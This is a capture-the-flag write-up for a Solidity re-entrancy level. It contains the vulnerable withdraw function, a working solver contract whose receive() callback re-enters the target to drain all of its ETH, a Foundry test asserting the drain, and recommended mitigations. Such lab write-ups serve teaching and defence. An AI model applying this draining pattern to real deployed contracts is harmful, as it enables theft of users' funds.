# 10. Re-entrancy

[English](10_Reentrancy.md) | [한국어](../ko/10_Reentrancy.md)

## Objective

Use the target's callback ordering to complete the level and leave its ETH balance at zero.

## Key Concepts

- Re-entrant callbacks
- Checks-Effects-Interactions
- State updates after external calls
- Solidity 0.6 arithmetic behavior
- Multi-version testing with `deployCode()`

## Contract Analysis

The target checks a recorded balance, sends ETH to the caller, and only then reduces that balance:

```solidity
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value: _amount}("");
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
    }
}
```

The low-level call transfers control to `msg.sender`. If the caller is a contract with a payable `receive()` function, that function runs before the original balance update. During the callback, the target still observes the previous recorded balance and permits another withdrawal.

## Solver Contract

The solver records the amount supplied by the player, assigns that amount to itself in the target, and requests a withdrawal:

```solidity
function solve() external payable {
    amount = msg.value;
    target.donate{value: amount}(address(this));
    target.withdraw(amount);
}
```

Each callback checks the target's remaining ETH and requests the smaller of the configured amount or the remaining balance:

```solidity
receive() external payable {
    uint256 targetBalance = address(target).balance;

    if (targetBalance > 0) {
        uint256 toWithdraw =
            targetBalance < amount ? targetBalance : amount;
        target.withdraw(toWithdraw);
    }
}
```

Using the smaller value also handles a final target balance below the original request amount.

## Solution Flow

The local scenario starts with 0.5 ETH supplied by a separate depositor. The player then supplies 1 ETH through the solver.

```text
Target starting balance = 0.5 ETH
        ↓
Solver records and supplies 1 ETH
        ↓
Target balance = 1.5 ETH
        ↓
Target sends 1 ETH before updating solver accounting
        ↓
Solver callback requests the remaining 0.5 ETH
        ↓
Target sends 0.5 ETH
        ↓
Target balance = 0
Solver balance = 1.5 ETH
```

The original Solidity 0.6 arithmetic behavior is preserved. When the nested calls return, repeated balance reductions may wrap rather than revert, which is another reason the legacy compiler version matters to this reproduction.

## Foundry Test

The target remains on Solidity 0.6 while the test and solver use Solidity 0.8. A minimal interface in the solver file keeps the compiler dependency graph separate:

```solidity
interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256);
    function withdraw(uint256 _amount) external;
}
```

The test deploys the legacy artifact with `deployCode()`:

```solidity
target = IReentrance(
    deployCode("10_Reentrancy.sol:Reentrance")
);
```

It then verifies both final balances:

```solidity
vm.prank(player);
solver.solve{value: 1 ether}();

assertEq(address(target).balance, 0);
assertEq(address(solver).balance, 1.5 ether);
```

## Root Cause

The contract performs an external interaction before updating the caller's accounting state. The callback can enter `withdraw()` again while the earlier invocation still observes the old balance.

## Recommended Mitigations

- Follow Checks-Effects-Interactions: reduce the recorded balance before sending ETH.
- Use a re-entrancy guard when a function cannot avoid an external callback.
- Prefer pull-based settlement where practical.
- Check low-level call results and use clear custom errors.
- Test callback recipients and nested execution paths.
- Use Solidity 0.8 or checked arithmetic for modern implementations, while recognizing that checked arithmetic does not replace correct call ordering.

## Run the Test

```bash
forge test --match-path test/10_Reentrancy.t.sol -vvv
```

For the complete callback trace:

```bash
forge test --match-path test/10_Reentrancy.t.sol -vvvv
```

## Takeaway

An external call transfers control. Update security-critical accounting before that transfer of control, and treat every recipient callback as code that may call the contract again.
